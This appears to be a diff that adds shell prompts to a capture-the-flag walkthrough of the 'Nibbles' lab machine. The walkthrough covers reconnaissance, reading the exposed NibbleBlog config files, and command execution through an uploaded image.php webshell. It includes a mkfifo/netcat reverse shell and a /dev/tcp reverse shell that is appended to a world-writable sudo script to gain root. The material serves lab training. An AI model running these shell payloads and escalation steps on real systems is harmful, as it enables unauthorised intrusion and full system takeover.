@@ -27,7 +27,7 @@ Two ports, both old:
 Full nmap with service and script scanning:
 
 ```bash
-nmap -sC -sV -oA nmap/nibbles 10.129.165.135
+$ nmap -sC -sV -oA nmap/nibbles 10.129.165.135
 ```
 
 ```
@@ -56,7 +56,7 @@ The homepage is almost empty, just `Hello world` printed to the page. The intere
 A comment that says "nothing interesting" is exactly where to look. Directory busting the root path returned nothing, so I pointed the buster at `/nibbleblog/` instead:
 
 ```bash
-dirsearch -u http://10.129.165.135/nibbleblog/
+$ dirsearch -u http://10.129.165.135/nibbleblog/
 ```
 
 ```
@@ -89,8 +89,8 @@ Name: Diego Najar
 NibbleBlog 4.0.3, codename Coffee. The default install leaves the private config readable, so I pulled the two XML files that matter and formatted them with `xmllint`:
 
 ```bash
-curl -s http://10.129.165.135/nibbleblog/content/private/config.xml | xmllint --format -
-curl -s http://10.129.165.135/nibbleblog/content/private/users.xml  | xmllint --format -
+$ curl -s http://10.129.165.135/nibbleblog/content/private/config.xml | xmllint --format -
+$ curl -s http://10.129.165.135/nibbleblog/content/private/users.xml  | xmllint --format -
 ```
 
 `users.xml` confirmed the admin username and showed the failed-login bookkeeping:
@@ -133,7 +133,7 @@ http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php
 Testing command execution:
 
 ```bash
-curl 'http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php?cmd=id'
+$ curl 'http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php?cmd=id'
 ```
 
 ```
@@ -143,13 +143,13 @@ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 That is RCE as `nibbler`. To upgrade from the webshell to an interactive shell I used a mkfifo reverse shell. I started a listener:
 
 ```bash
-nc -lnvp 4444
+$ nc -lnvp 4444
 ```
 
 Then fired it through the webshell (URL-encoded):
 
 ```bash
-curl 'http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php' \
+$ curl 'http://10.129.165.135/nibbleblog/content/private/plugins/my_image/image.php' \
   --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.32 4444 >/tmp/f'
 ```
 
@@ -167,7 +167,7 @@ personal  personal.zip  user.txt
 `personal.zip` unzips to `personal/stuff/monitor.sh`. On a clean boot the extracted tree may not be present yet, in which case unzipping it is what creates the `stuff/monitor.sh` path:
 
 ```bash
-unzip personal.zip
+$ unzip personal.zip
 ```
 
 ## root
@@ -186,7 +186,7 @@ User nibbler may run the following commands on Nibbles:
 nibbler can run `monitor.sh` as root with no password. The catch that makes this trivial is where the script lives and what its permissions are. It sits inside nibbler's own home, and it is world-writable:
 
 ```bash
-ls -la /home/nibbler/personal/stuff/monitor.sh
+$ ls -la /home/nibbler/personal/stuff/monitor.sh
 ```
 
 ```
@@ -196,13 +196,13 @@ ls -la /home/nibbler/personal/stuff/monitor.sh
 So I control the contents of a script root will execute. I appended a reverse shell rather than overwriting the file, so I do not clobber whatever the script was meant to do and break some other behaviour I might still need:
 
 ```bash
-echo "bash -c 'exec bash -i &>/dev/tcp/10.10.16.32/4444 <&1'" >> /home/nibbler/personal/stuff/monitor.sh
+$ echo "bash -c 'exec bash -i &>/dev/tcp/10.10.16.32/4444 <&1'" >> /home/nibbler/personal/stuff/monitor.sh
 ```
 
 With a fresh listener up, I ran it through sudo:
 
 ```bash
-sudo /home/nibbler/personal/stuff/monitor.sh
+$ sudo /home/nibbler/personal/stuff/monitor.sh
 ```
 
 The original script body runs, then the appended line fires my shell back as root, and the listener catches a uid 0 session. The root flag is in `/root/root.txt`.
